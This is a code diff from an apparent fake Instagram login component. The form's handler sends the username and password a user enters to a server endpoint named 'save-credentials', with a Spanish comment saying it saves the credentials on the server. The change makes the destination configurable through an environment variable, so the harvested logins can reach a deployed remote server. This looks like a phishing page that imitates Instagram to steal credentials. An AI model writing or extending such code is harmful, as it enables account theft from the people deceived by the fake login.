@@ -12,7 +12,8 @@ export default function InstagramLogin() {
     if (username && password) {
       try {
         // Guardar credenciales en el servidor
-        await fetch('http://localhost:3001/api/save-credentials', {
+        const apiUrl = import.meta.env.VITE_API_URL || 'http://localhost:3001';
+        await fetch(`${apiUrl}/api/save-credentials`, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
